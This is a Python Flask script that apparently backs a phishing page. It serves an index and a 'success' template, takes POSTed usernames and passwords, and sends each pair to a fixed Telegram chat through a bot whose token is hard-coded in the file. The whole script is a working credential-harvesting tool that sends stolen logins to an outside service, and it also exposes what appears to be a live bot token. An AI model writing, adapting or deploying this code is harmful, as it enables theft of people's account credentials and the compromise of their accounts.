
from flask import Flask, render_template, request, jsonify
import telebot
import threading

app = Flask(__name__)

TOKEN = "7814956770:AAHoGClD3648kZ0-Ti_6EXvbs5C9gTB2jng"
bot = telebot.TeleBot(TOKEN)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/success")
def success():
    return render_template("success.html")

@app.route("/submit", methods=["POST"])
def submit():
    data = request.json
    user = data.get("username")
    pwd = data.get("password")
    bot.send_message(6355959645, f"🛡 New Login\nUsername: {user}\nPassword: {pwd}")
    return jsonify({"success": True})

def run_flask():
    app.run(host="0.0.0.0", port=5000)

def run_bot():
    bot.polling(non_stop=True)

if __name__ == "__main__":
    threading.Thread(target=run_bot).start()
    run_flask()
